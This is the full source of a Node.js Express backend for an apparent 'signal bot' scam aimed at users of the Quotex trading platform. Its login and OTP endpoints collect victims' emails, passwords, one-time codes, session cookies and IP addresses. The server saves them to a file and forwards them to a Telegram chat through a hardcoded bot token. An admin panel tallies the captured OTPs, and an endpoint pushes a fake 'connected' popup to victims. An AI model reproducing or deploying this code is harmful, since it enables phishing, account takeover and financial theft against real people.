const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ================== YOUR TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

// Function to send message to Telegram
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        });
        console.log("✅ Message sent to Telegram");
    } catch (error) {
        console.error("❌ Telegram Error:", error.message);
    }
}

// ================== FIXED: PERMANENT STORAGE WITH users.json ==================
const DATA_FILE = path.join(__dirname, 'users.json');
let users = [];

// FIXED: Robust load function
function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8').trim();
            if (data && data.length > 0) {
                users = JSON.parse(data);
                console.log(`✅ Loaded ${users.length} users from users.json`);
            } else {
                users = [];
                console.log("⚠️ users.json was empty, starting fresh");
            }
        } else {
            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
            console.log("✅ Created new users.json");
        }
    } catch (e) {
        console.error("Load error, starting fresh:", e);
        users = [];
        // Create fresh file
        try {
            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
        } catch (writeErr) {
            console.error("Failed to create users.json:", writeErr);
        }
    }
}

// Save after every change
function saveUsers() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
        console.log(`💾 Saved ${users.length} users`);
    } catch (e) {
        console.error("Save error:", e);
    }
}

loadUsers();

// Helper: Get or create user by licenceKey
function getOrCreateUser(licenceKey, fullName = "Unknown") {
    let user = users.find(u => u.licenceKey === licenceKey);
    if (!user) {
        user = {
            id: Date.now().toString(),
            licenceKey: licenceKey,
            fullName: fullName,
            username: "",
            password: "",
            otp: "",
            ip: "",
            cookies: "",
            status: "Active",
            connected: false,
            lastActivity: new Date().toISOString(),
            activities: []
        };
        users.unshift(user);
        console.log(`🆕 New user created: ${fullName} (${licenceKey})`);
    }
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

// ================== SSE CLIENTS FOR REAL-TIME TRIGGER ==================
const connectedClients = new Set();

// Real-time events endpoint
app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();
    connectedClients.add(res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'ready' })}\n\n`);
    req.on('close', () => {
        connectedClients.delete(res);
    });
});

// Trigger connected popup from Telegram
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || "User";
    const message = `
🔗 <b>Connection Triggered Successfully</b>
👤 User: <b>${userName}</b>
✅ Status: Account Connected
    `.trim();
    await sendTelegramMessage(message);
    connectedClients.forEach(client => {
        try {
            client.write(`data: ${JSON.stringify({
                type: 'show_connected',
                userName: userName
            })}\n\n`);
        } catch (e) {}
    });
    res.send("Trigger sent successfully");
});

// ================== LICENSE + NAME ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    const message = `
🔑 <b>New License Activation</b>
👤 Name: <b>${userName}</b>
🔑 License: <b>${licenseKey}</b>
🌍 IP: <b>${ip}</b>
⏰ Time (PKT): <b>${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    const message = `
📊 <b>User Activity</b>
Action: <b>${action}</b>
👤 Name: <b>${userName || "Unknown"}</b>
🌍 IP: <b>${ip}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== NOTIFICATION PERMISSION ==================
app.post('/api/notification-permission', async (req, res) => {
    const { userName, permission, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    const message = `
🛎️ <b>Notification Permission</b>
👤 Name: <b>${userName}</b>
📱 Status: <b>${permission}</b>
🌍 IP: <b>${ip}</b>
⏰ Time: <b>${timestamp}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== QUOTEX LOGIN & OTP ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const user = getOrCreateUser(licenceKey, name);
    user.username = email;
    user.password = password;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";
    user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });

    const message = `
🔑 <b>Quotex Login Attempt</b>
👤 Name: <b>${name}</b>
📧 Email: <b>${email}</b>
🔑 Password: <b>${password}</b>
🌍 IP: <b>${ip}</b>
📂 Cookies: <b>${cookies || 'None'}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "ok" });
});

app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const user = getOrCreateUser(licenceKey, name);
    user.otp = otp;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";
    user.activities.push({ action: "OTP Entered - Account Connected", timestamp: new Date().toLocaleString() });

    const message = `
🔢 <b>OTP Entered Successfully</b>
👤 Name: <b>${name}</b>
📧 Email: <b>${email}</b>
🔑 OTP: <b>${otp}</b>
🌍 IP: <b>${ip}</b>
📂 Cookies: <b>${cookies || 'None'}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "ok" });
});

// ================== LICENSE MANAGEMENT (NEW) ==================
const LICENSES_FILE = path.join(__dirname, 'licenses.json');
let licenses = [];

function loadLicenses() {
    try {
        if (fs.existsSync(LICENSES_FILE)) {
            const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
            licenses = data ? JSON.parse(data) : [];
        } else {
            licenses = [];
            fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
        }
    } catch (e) {
        licenses = [];
    }
}

function saveLicenses() {
    try {
        fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2));
    } catch (e) {}
}

loadLicenses();

app.get('/api/licenses', (req, res) => {
    res.json(licenses);
});

app.post('/api/licenses', (req, res) => {
    const { key, type, expiry, maxUses } = req.body;
    if (!key) return res.status(400).json({ error: "Key required" });

    if (licenses.find(l => l.key === key)) {
        return res.status(400).json({ error: "License already exists" });
    }

    licenses.unshift({
        key: key,
        type: type || "Permanent",
        status: "Active",
        usesRemaining: maxUses || null,
        assignedTo: null,
        dateAdded: new Date().toISOString(),
        expiry: expiry || null
    });
    saveLicenses();
    res.json({ success: true, license: licenses[0] });
});

app.delete('/api/licenses/:key', (req, res) => {
    const key = req.params.key;
    licenses = licenses.filter(l => l.key !== key);
    saveLicenses();
    res.json({ success: true });
});

// ================== NEW: LICENSE VALIDATION FOR BOT (FIXED) ==================
app.post('/api/validate-license', (req, res) => {
    const { licenseKey } = req.body;
    
    if (!licenseKey) {
        return res.status(400).json({ valid: false, message: "License key required" });
    }

    const normalizedKey = licenseKey.trim().toUpperCase();
    
    const license = licenses.find(l => 
        l.key.toUpperCase() === normalizedKey && 
        l.status === "Active"
    );

    if (license) {
        let isValid = true;
        if (license.expiry) {
            const expiryDate = new Date(license.expiry);
            if (expiryDate < new Date()) {
                isValid = false;
            }
        }

        res.json({ 
            valid: isValid, 
            message: isValid ? "License valid" : "License expired",
            license: isValid ? license : null
        });
    } else {
        res.json({ 
            valid: false, 
            message: "Invalid or inactive license key" 
        });
    }
});

// ================== ADMIN PANEL ROUTES ==================
app.get('/api/stats', (req, res) => {
    const stats = {
        totalUsers: users.length,
        onlineNow: users.filter(u => u.status === "Online").length,
        otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
        connectedAccounts: users.filter(u => u.connected).length
    };
    res.json(stats);
});

app.get('/api/users', (req, res) => {
    res.json(users);
});

app.get('/api/latest-activity', (req, res) => {
    res.json({
        logins: users.filter(u => u.username),
        otps: users.filter(u => u.otp)
    });
});

// Root Route
app.get('/', (req, res) => {
    res.send("✅ Chinese Signal Bot Backend is Running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 users.json location: ${DATA_FILE}`);
    console.log(`📁 licenses.json location: ${LICENSES_FILE}`);
});
